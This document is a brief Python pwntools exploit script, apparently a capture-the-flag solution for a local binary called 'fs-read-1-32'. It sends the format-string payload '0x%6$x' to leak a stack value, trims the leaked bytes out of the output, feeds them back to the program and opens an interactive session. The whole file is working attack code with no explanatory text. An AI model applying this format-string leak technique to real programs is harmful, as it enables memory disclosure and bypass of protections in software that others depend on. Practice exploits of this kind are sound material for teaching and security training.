#!/usr/bin/env python
from pwn import *

p = process("./fs-read-1-32")

p.sendline('0x%6$x')

data = p.recv(0x200)

#print(data)

new_data = data[36:-34]

print(new_data)

p.sendline(new_data)

p.interactive()